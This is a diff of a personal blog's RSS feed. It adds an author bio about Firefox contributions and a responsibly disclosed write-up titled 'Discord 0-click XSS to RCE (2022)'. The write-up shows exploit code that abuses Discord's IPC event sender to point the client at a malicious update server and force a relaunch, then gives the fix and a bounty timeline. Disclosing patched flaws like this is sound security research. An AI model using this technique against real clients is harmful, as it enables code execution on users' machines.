+&lt;h3 id=&#34;who&#34;&gt;Who&lt;/h3&gt;
+&lt;p&gt;I go by &lt;code&gt;CanadaHonk&lt;/code&gt; (I prefer not to share my full name publicly/obviously online). Summary of yours truly:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;Individual request handlers go in &lt;code&gt;requests/&lt;/code&gt;; with the host updates being in &lt;code&gt;requests/host/&lt;/code&gt; for further organisation. Module downloading is also a directory, as it is much more complicated than the other handlers (due to the procedural patching of the &lt;code&gt;desktop_core&lt;/code&gt; module).&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Generic utility functions for the request handlers go in &lt;code&gt;generic/&lt;/code&gt; - redirect and proxy being the two types / modes. Redirect simply redirects the original request to Discord, whilst proxy actually proxies (asks Discord for the normal response then allows the individual handler to edit the response to relay it to the client).&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Dashboard things (&lt;a class=&#34;link&#34; href=&#34;https://updates.goosemod.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;this dashboard&lt;/a&gt;) go in &lt;code&gt;dashboard/&lt;/code&gt;; with the template HTML and the request handler in it.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;The temporary migration from GooseUpdate v1 to v2 is included as well in simply &lt;code&gt;v2Migration.js&lt;/code&gt;. This is required as the old endpoint was simply &lt;code&gt;&amp;lt;host&amp;gt;&lt;/code&gt;, but in v2 I added branches which allow choosing with specific mods you want. New endpoints look like &lt;code&gt;&amp;lt;host&amp;gt;/&amp;lt;branches&amp;gt;&lt;/code&gt; (for example: &lt;code&gt;&amp;lt;host&amp;gt;/goosemod&lt;/code&gt; or &lt;code&gt;&amp;lt;host&amp;gt;/betterdiscord+goosemod&lt;/code&gt;).&lt;/p&gt;
-&lt;/li&gt;
+&lt;li&gt;I live in the UK (but have no particular allegiance)&lt;/li&gt;
+&lt;li&gt;My programming knowledge is entirely self-taught in my free time. I have not been to (UK) university/etc (and do not plan to for now).&lt;/li&gt;
+&lt;li&gt;My free time is spent largely on programming open source projects (my own and others, large and small). Mostly Firefox (more below), &lt;a class=&#34;link&#34; href=&#34;https://porffor.goose.icu&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;my JS compiler&lt;/a&gt;, and more recently &lt;a class=&#34;link&#34; href=&#34;https://github.com/nodejs/node/pulls?q=is%3Apr&amp;#43;author%3ACanadaHonk&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Node.js&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;how&#34;&gt;How&lt;/h3&gt;
+&lt;p&gt;Since about February this year, I began contributing to Gecko (Firefox&amp;rsquo;s web engine). I started by fixing some small &lt;a class=&#34;link&#34; href=&#34;https://chromedevtools.github.io/devtools-protocol/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CDP&lt;/a&gt; (Chrome&amp;rsquo;s remote debugging protocol) bugs I had encountered while working on a personal project. I then got hooked and did more complex things like adding some new commands/features which I found handy.&lt;/p&gt;
+&lt;p&gt;Next I began branching out: doing a bit of work on Necko (Gecko&amp;rsquo;s network stack); and layout/Stylo (&lt;a class=&#34;link&#34; href=&#34;https://servo.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Servo&lt;/a&gt;&amp;rsquo;s style system in Gecko). I slowly started doing more and more layout work until I am mostly just working on that.&lt;/p&gt;
+&lt;p&gt;Finally, I went from only smaller/simpler fixes to implementing new web platform features. Here&amp;rsquo;s a list of notable things I&amp;rsquo;ve added to Firefox this year in my free time:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@media (scripting)&lt;/code&gt; (113)&lt;/li&gt;
+&lt;li&gt;CSS &lt;code&gt;NaN&lt;/code&gt;/&lt;code&gt;infinity&lt;/code&gt; fixes + ship (114)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@import supports()&lt;/code&gt; (115)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;URL.canParse()&lt;/code&gt; (115)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;search&amp;gt;&lt;/code&gt; (118)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;attr()&lt;/code&gt; fallback (119)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@media (prefers-reduced-transparency)&lt;/code&gt; (behind pref)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;@media (inverted-colors)&lt;/code&gt; (behind pref)&lt;/li&gt;
+&lt;li&gt;NVIDIA Video Super Resolution (behind pref)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;If you like stats; I was the ~5th highest individual contributor this year by commits &lt;a class=&#34;link&#34; href=&#34;https://bkardell.com/blog/2023-Mid-Season-Power-Rankings.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;(source)&lt;/a&gt;, as of writing, I have:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Submitted 93 patches&lt;/li&gt;
+&lt;li&gt;Filed 80 bugs&lt;/li&gt;
+&lt;li&gt;Filed 9 intents (2 prototype, 3 ship, 4 prototype+ship)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A few months ago, a Mozillian suggested I try to get a job there, then I started talking with some people about a potential contract&amp;hellip; and now here we are! Still feels quite surreal. Thank you to many Mozillians for supporting me, reviewing patches, and just generally being great people! :)&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Discord 0-click XSS to RCE (2022)</title>
+        <link>/discord-0click-xss-to-rce/</link>
+        <pubDate>Fri, 07 Oct 2022 00:00:00 +0000</pubDate>
+        
+        <guid>/discord-0click-xss-to-rce/</guid>
+        <description>&lt;h2 id=&#34;discords-ipc-allowlist&#34;&gt;Discord&amp;rsquo;s IPC Allowlist&lt;/h2&gt;
+&lt;p&gt;Discord expose a wrapped version of &lt;code&gt;ipcRenderer&lt;/code&gt; for security, see &lt;a class=&#34;link&#34; href=&#34;/discord-1click-xss-to-rce&#34; &gt;my 1-click Discord XSS to RCE&lt;/a&gt; for more details on Electron&amp;rsquo;s IPC. It&amp;rsquo;s implemented with a &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Set&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;discordPrefixRegex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;/^DISCORD_/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getDiscordIPCEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;discordPrefixRegex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`DISCORD_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;RENDERER_IPC_SEND_WHITELIST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt; &lt;span class=&#34;cm&#34;&gt;/* ... */&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;prefixedEvent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getDiscordIPCEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;RENDERER_IPC_SEND_WHITELIST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prefixedEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cannot send this event&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ipcRenderer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;prefixedEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This restricts the IPC calls we can make heavily, so it becomes not very useful to us.&lt;/p&gt;
+&lt;h2 id=&#34;bypassing-discords-ipc-protections&#34;&gt;Bypassing Discord&amp;rsquo;s IPC Protections&lt;/h2&gt;
+&lt;p&gt;With Electron&amp;rsquo;s &lt;code&gt;on&lt;/code&gt; handler for IPC it includes the &lt;code&gt;sender&lt;/code&gt; of the event, with Discord&amp;rsquo;s wrapper the original event is unmodified and passed through:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ipcRenderer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getDiscordIPCEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;sender&lt;/code&gt; allows use to bypass Discord&amp;rsquo;s protections and use IPC arbitrarily with &lt;code&gt;event.sender.on&lt;/code&gt;, &lt;code&gt;event.sender.invoke&lt;/code&gt;, etc. So now we have arbitary IPC, how can we get to Node execution?&lt;/p&gt;
+&lt;h2 id=&#34;discord-settings&#34;&gt;Discord Settings&lt;/h2&gt;
+&lt;p&gt;Discord has a settings file, &lt;code&gt;settings.json&lt;/code&gt;, which contain several options as key/value pairs in an object. One of these options is setting the update endpoint to update Discord&amp;rsquo;s client from (&lt;code&gt;NEW_UPDATE_ENDPOINT&lt;/code&gt; on Windows, &lt;code&gt;UPDATE_ENDPOINT&lt;/code&gt; on Linux/Mac). I have previously made &lt;a class=&#34;link&#34; href=&#34;https://github.com/Goose-Nest/GooseUpdate&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;open source recreations of Discord&amp;rsquo;s update server(s)&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Normally, Discord&amp;rsquo;s IPC protections (allowlist) prevents us from modifying it, but with our bypass we can freely do it with &lt;code&gt;DISCORD_SETTINGS_SET&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;creating-a-malicious-update-server&#34;&gt;Creating a Malicious Update Server&lt;/h2&gt;
+&lt;p&gt;Discord&amp;rsquo;s update server is quite complex and general so I won&amp;rsquo;t go into details in this post. It uses native modules which I also explained in &lt;a class=&#34;link&#34; href=&#34;/discord-1click-xss-to-rce&#34; &gt;my 1-click Discord XSS to RCE&lt;/a&gt;. I made a script which compiles a server by:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Get the payload and add it into the &lt;code&gt;discord_desktop_core&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Recompute the hash for the module and bundle it into the expected format for the client&lt;/li&gt;
+&lt;li&gt;Download the official update manifest&lt;/li&gt;
+&lt;li&gt;Modify it so desktop core&amp;rsquo;s version is increased causing it to update, and the hash matches the new one with our payload injected&lt;/li&gt;
+&lt;li&gt;Point desktop core&amp;rsquo;s download to our server and leave the rest to the official server&lt;/li&gt;
+&lt;li&gt;Start a HTTP server on localhost with our modified manifest and desktop core&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;injecting-our-malicious-update-server&#34;&gt;Injecting Our Malicious Update Server&lt;/h2&gt;
+&lt;p&gt;Since we now have our malicious update server and a way to add it to the user&amp;rsquo;s settings, we can make our exploit:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Bypass Discord&amp;rsquo;s IPC protections to achieve arbitary IPC&lt;/li&gt;
+&lt;li&gt;Set a malicious update endpoint for the client to use&lt;/li&gt;
+&lt;li&gt;Restart so the client is forced to update (Discord&amp;rsquo;s client updates on every start)&lt;/li&gt;
+&lt;li&gt;Our payload is executed&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Which looks like:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;DiscordNative&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ipc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DISCORD_UPDATER_HISTORY_RESPONSE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sender&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Listen to event
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;sender&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DISCORD_SETTINGS_SET&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;NEW_UPDATE_ENDPOINT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://localhost:9999/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Set our custom malicious update server to be used
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;DiscordNative&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;relaunch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Relaunch to force update now
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;DiscordNative&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ipc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;DISCORD_UPDATER_HISTORY_QUERY_AND_TRUNCATE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// Trigger event so our listener is called
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;the-fix&#34;&gt;The Fix&lt;/h2&gt;
+&lt;p&gt;The fixed code makes sure the event isn&amp;rsquo;t included in the callback (taken directly from the original code):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ipcRenderer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getDiscordIPCEvent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// Sender is dangerous, do not expose.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;apply&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;...[...&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;slice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;report-timeline&#34;&gt;Report Timeline&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;26th July 2022: Reported to Discord via HackerOne&lt;/li&gt;
+&lt;li&gt;27th July 2022: Confirmation of a high-severity issue&lt;/li&gt;
+&lt;li&gt;16th August 2022: Fixed in Canary&lt;/li&gt;
+&lt;li&gt;19th August 2022: Fixed in Stable&lt;/li&gt;
+&lt;li&gt;2nd September 2022: Confirmation of fix from Discord&lt;/li&gt;
+&lt;li&gt;2nd September 2022: $1500 bounty from Discord&lt;/li&gt;
 &lt;/ul&gt;
 </description>
         </item>
         <item>
-        <title>Discord&#39;s Telemetry on WebSocket Connect</title>
-        <link>https://honk.camp/p/discords-telemetry-on-websocket-connect/</link>
-        <pubDate>Sun, 13 Dec 2020 00:00:00 +0000</pubDate>
+        <title>Discord 1-click XSS to RCE (2020)</title>
+        <link>/discord-1click-xss-to-rce/</link>
+        <pubDate>Sat, 01 Oct 2022 00:00:00 +0000</pubDate>
         
-        <guid>https://honk.camp/p/discords-telemetry-on-websocket-connect/</guid>
-        <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
-&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://discord.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Discord&lt;/a&gt; uses a WebSocket for communication between their servers and it&amp;rsquo;s web client. I decided to look into it to see if it has any telemetry with their desktop client (even a tiny amount); it does.&lt;/p&gt;
-&lt;h2 id=&#34;the-websocket&#34;&gt;The WebSocket&lt;/h2&gt;
-&lt;h3 id=&#34;websocket-intro&#34;&gt;WebSocket Intro&lt;/h3&gt;
-&lt;p&gt;WebSockets are great for using low bandwidth / data and fast communication, as it is event-driven and can easily support compressed and small messages. They are primarily used in the web, but can also be used server-side for some things.&lt;/p&gt;
-&lt;h3 id=&#34;gateway&#34;&gt;Gateway&lt;/h3&gt;
-&lt;p&gt;Discord call their WebSocket their &amp;ldquo;gateway&amp;rdquo;, hosted on &lt;code&gt;gateway.discord.gg&lt;/code&gt;. It is used primarily for actions which require speed so it would be ineffective to use their HTTP REST API. Primarily, it looks like it is used to recieving messages. It is connected with some query parameters, for example:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;wss://gateway.discord.gg/?encoding=etf&amp;amp;v=8&amp;amp;compress=zlib-stream
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;the-telemetry&#34;&gt;The Telemetry&lt;/h2&gt;
